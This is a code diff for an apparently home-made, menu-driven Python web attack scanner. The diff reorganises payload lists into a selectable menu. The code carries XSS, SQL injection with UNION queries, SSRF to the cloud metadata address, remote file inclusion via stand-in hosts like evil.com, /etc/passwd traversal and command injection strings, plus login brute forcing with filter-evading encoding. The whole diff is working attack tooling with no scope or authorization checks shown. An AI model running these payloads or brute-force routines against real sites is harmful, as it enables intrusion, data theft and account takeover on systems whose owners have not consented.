@@ -76,7 +76,7 @@ def crawl_for_forms(url, visited=None):
         response.raise_for_status()
     except requests.exceptions.RequestException as e:
         log_result("Crawl", "Error", f"Error crawling {url}: {e}", url)
-        return visited
+        return []
     
     soup = BeautifulSoup(response.text, 'html.parser')
     forms = soup.find_all('form')
@@ -106,19 +106,19 @@ def obfuscate_payload(payload):
         html.escape(payload)  # HTML entity encoding
     ]
 
+# Load payloads from file
+def load_payloads_from_file(file_path):
+    try:
+        with open(file_path, 'r') as file:
+            payloads = [line.strip() for line in file.readlines()]
+        return payloads
+    except IOError:
+        print(f"Error reading file '{file_path}'. Please check the file path and try again.")
+        return None
+
 # XSS Testing for both stored and reflected XSS
-def xss_test(url, forms):
-    payloads = [
-        "<script>alert('XSS');</script>",
-        "<img src=x onerror=alert('XSS')>",
-        "<body onload=alert('XSS')>",
-        "<svg/onload=alert('XSS')>",
-        "\";alert('XSS');//",
-        "';alert('XSS');",
-        "<iframe src=javascript:alert('XSS')>",
-        "<math><mi><mo><mtext><mn><ms><mtext><mglyph><malignmark><maligngroup><ms><mtext>&lt;script&gt;alert('XSS')&lt;/script&gt;</mtext></ms></maligngroup></malignmark></mglyph></mn></mtext></mo></mi></math>",
-        "<script>alert(String.fromCharCode(88,83,83))</script>",
-    ]
+def xss_test(url, payloads):
+    forms = crawl_for_forms(url)
     
     def check_response(response, payload):
         if payload in response.text:
@@ -149,13 +149,8 @@ def xss_test(url, forms):
     log_result("XSS Test", "Not Vulnerable", f"No XSS vulnerability detected", url)
 
 # SQL Injection Testing for both parameters and headers
-def sql_injection_test(url, forms):
-    payloads = [
-        "' OR '1'='1",
-        "' OR '1'='1' --",
-        "' OR '1'='1' /*",
-        "' OR 1=1 --"
-    ]
+def sql_injection_test(url, payloads):
+    forms = crawl_for_forms(url)
     modulating_payloads = [
         "' UNION SELECT 1,2,3,4,5,6,concat(database(),system_user(),@@version)-- -",
         "' UNION SELECT NULL, NULL, NULL, NULL, NULL, concat(database(), system_user(), @@version)-- -"
@@ -199,12 +194,8 @@ def sql_injection_test(url, forms):
     log_result("SQL Injection Test", "Not Vulnerable", f"No SQL Injection vulnerability detected", url)
 
 # SSRF Testing
-def ssrf_test(url, forms):
-    payloads = [
-        "http://localhost:8080",
-        "http://127.0.0.1:8080",
-        "http://169.254.169.254"
-    ]
+def ssrf_test(url, payloads):
+    forms = crawl_for_forms(url)
     modulating_payloads = [
         "http://169.254.169.254/latest/meta-data/",
         "http://localhost/admin"
@@ -241,12 +232,8 @@ def ssrf_test(url, forms):
     log_result("SSRF Test", "Not Vulnerable", f"No SSRF vulnerability detected", url)
 
 # RFI Testing
-def rfi_test(url, forms):
-    payloads = [
-        "http://example.com/malicious_file",
-        "http://evil.com/evil_script",
-        "http://attacker.com/backdoor"
-    ]
+def rfi_test(url, payloads):
+    forms = crawl_for_forms(url)
     
     for form in forms:
         action = form['action']
@@ -268,12 +255,8 @@ def rfi_test(url, forms):
     log_result("RFI Test", "Not Vulnerable", f"No RFI vulnerability detected", url)
 
 # LFI Testing
-def lfi_test(url, forms):
-    payloads = [
-        "../../../../etc/passwd",
-        "../../../../../etc/passwd",
-        "../../../../../../etc/passwd"
-    ]
+def lfi_test(url, payloads):
+    forms = crawl_for_forms(url)
     
     for form in forms:
         action = form['action']
@@ -295,22 +278,8 @@ def lfi_test(url, forms):
     log_result("LFI Test", "Not Vulnerable", f"No LFI vulnerability detected", url)
 
 # Command Injection Testing
-def command_injection_test(url, forms):
-    payloads = [
-        "id; ls",
-        "whoami; cat /etc/passwd",
-        "uname -a; ls -la",
-        "`id`",
-        "$(id)",
-        "`uname -a`",
-        "&& whoami",
-        "|| uname -a",
-        "| id",
-        ";& id",
-        "|& id",
-        "%0A id",
-        "%0A uname -a"
-    ]
+def command_injection_test(url, payloads):
+    forms = crawl_for_forms(url)
     
     def check_response(response):
         keywords = ["uid=", "root", "Linux", "id", "whoami"]
@@ -339,18 +308,13 @@ def command_injection_test(url, forms):
     log_result("Command Injection Test", "Not Vulnerable", f"No command injection detected", url)
 
 # Header Injection Testing
-def header_injection_test(url, forms):
+def header_injection_test(url, payloads):
+    forms = crawl_for_forms(url)
     headers = {
         "User-Agent": "Mozilla/5.0",
         "Referer": "http://example.com",
         "X-Forwarded-For": "127.0.0.1"
     }
-    payloads = [
-        "\r\nX-Test: injected-header",
-        "\nX-Test: injected-header",
-        "%0d%0aX-Test: injected-header",
-        "%0aX-Test: injected-header"
-    ]
     
     for form in forms:
         action = form['action']
@@ -370,7 +334,8 @@ def header_injection_test(url, forms):
     log_result("Header Injection Test", "Not Vulnerable", f"No header injection detected", url)
 
 # Brute Force Testing for Login Forms
-def brute_force_test(url, username, wordlist, forms):
+def brute_force_test(url, username, wordlist, payloads):
+    forms = crawl_for_forms(url)
     with open(wordlist, 'r') as f:
         for password in f.readlines():
             password = password.strip()
@@ -391,11 +356,14 @@ def login(url, username, password):
     obfuscated_passwords = obfuscate_payload(password)
     for obfuscated_password in obfuscated_passwords:
         login_data = {"username": username, "password": obfuscated_password}
-        response = session.post(url, data=login_data)
-        if response.status_code == 200:
-            log_result("Login", "Success", f"Login successful with {username}/{password}", url, "password")
-            return session
-    log_result("Login", "Failure", f"Login failed with {username}/{password}", url, "password")
+        try:
+            response = session.post(url, data=login_data)
+            response.raise_for_status()
+            if response.status_code == 200:
+                log_result("Login", "Success", f"Login successful with {username}/{password}", url, "password")
+                return session
+        except requests.exceptions.RequestException as e:
+            log_result("Login", "Failure", f"Login failed with {username}/{password} - {e}", url, "password")
     return None
 
 # API Testing (e.g., POST or GET requests)
@@ -435,36 +403,110 @@ def display_menu():
     print("10. Session Handling 11. API Testing       12. Generate Report")
     print("13. Exit")
 
+def display_payload_menu():
+    print("\nPayload Options:")
+    print("1. Load payloads from file")
+    print("2. Use default payloads")
+
 def handle_menu_choice(choice):
     target_url = input("Enter target URL: ")
-    forms = crawl_for_forms(target_url)
-    if choice in [9, 10]:
-        username = input("Enter username for brute force/login (if applicable): ")
-        wordlist = input("Enter wordlist file path (if applicable): ")
-    else:
-        username = None
-        wordlist = None
+    payloads = []
+    
+    if choice in [2, 3, 4, 5, 6, 7, 8, 9]:
+        display_payload_menu()
+        payload_choice = int(input("Enter your choice: "))
+        if payload_choice == 1:
+            while True:
+                file_path = input("Enter the path to the payload file: ")
+                payloads = load_payloads_from_file(file_path)
+                if payloads is not None:
+                    break
+        else:
+            if choice == 2:
+                payloads = [
+                    "<script>alert('XSS');</script>",
+                    "<img src=x onerror=alert('XSS')>",
+                    "<body onload=alert('XSS')>",
+                    "<svg/onload=alert('XSS')>",
+                    "\";alert('XSS');//",
+                    "';alert('XSS');",
+                    "<iframe src=javascript:alert('XSS')>",
+                    "<math><mi><mo><mtext><mn><ms><mtext><mglyph><malignmark><maligngroup><ms><mtext>&lt;script&gt;alert('XSS')&lt;/script&gt;</mtext></ms></maligngroup></malignmark></mglyph></mn></mtext></mo></mi></math>",
+                    "<script>alert(String.fromCharCode(88,83,83))</script>",
+                ]
+            elif choice == 3:
+                payloads = [
+                    "' OR '1'='1",
+                    "' OR '1'='1' --",
+                    "' OR '1'='1' /*",
+                    "' OR 1=1 --"
+                ]
+            elif choice == 4:
+                payloads = [
+                    "http://localhost:8080",
+                    "http://127.0.0.1:8080",
+                    "http://169.254.169.254"
+                ]
+            elif choice == 5:
+                payloads = [
+                    "http://example.com/malicious_file",
+                    "http://evil.com/evil_script",
+                    "http://attacker.com/backdoor"
+                ]
+            elif choice == 6:
+                payloads = [
+                    "../../../../etc/passwd",
+                    "../../../../../etc/passwd",
+                    "../../../../../../etc/passwd"
+                ]
+            elif choice == 7:
+                payloads = [
+                    "id; ls",
+                    "whoami; cat /etc/passwd",
+                    "uname -a; ls -la",
+                    "`id`",
+                    "$(id)",
+                    "`uname -a`",
+                    "&& whoami",
+                    "|| uname -a",
+                    "| id",
+                    ";& id",
+                    "|& id",
+                    "%0A id",
+                    "%0A uname -a"
+                ]
+            elif choice == 8:
+                payloads = [
+                    "\r\nX-Test: injected-header",
+                    "\nX-Test: injected-header",
+                    "%0d%0aX-Test: injected-header",
+                    "%0aX-Test: injected-header"
+                ]
 
     if choice == 1:
         crawl_for_forms(target_url)
     elif choice == 2:
-        xss_test(target_url, forms)
+        xss_test(target_url, payloads)
     elif choice == 3:
-        sql_injection_test(target_url, forms)
+        sql_injection_test(target_url, payloads)
     elif choice == 4:
-        ssrf_test(target_url, forms)
+        ssrf_test(target_url, payloads)
     elif choice == 5:
-        rfi_test(target_url, forms)
+        rfi_test(target_url, payloads)
     elif choice == 6:
-        lfi_test(target_url, forms)
+        lfi_test(target_url, payloads)
     elif choice == 7:
-        command_injection_test(target_url, forms)
+        command_injection_test(target_url, payloads)
     elif choice == 8:
-        header_injection_test(target_url, forms)
+        header_injection_test(target_url, payloads)
     elif choice == 9:
-        brute_force_test(target_url, username, wordlist, forms)
+        username = input("Enter username for brute force/login (if applicable): ")
+        wordlist = input("Enter wordlist file path (if applicable): ")
+        brute_force_test(target_url, username, wordlist, payloads)
     elif choice == 10:
-        session = login(target_url, username, "password")
+        username = input("Enter username for login: ")
+        password = input("Enter password for login: ")
+        session = login(target_url, username, password)
         if session:
             log_result("Session Handling", "Info", f"Logged in with {username}", target_url, "password")
     elif choice == 11:
@@ -477,6 +519,7 @@ def handle_menu_choice(choice):
 
 # Main function to run the menu-driven program
 def main():
+    print_banner()
     while True:
         display_menu()
         try:
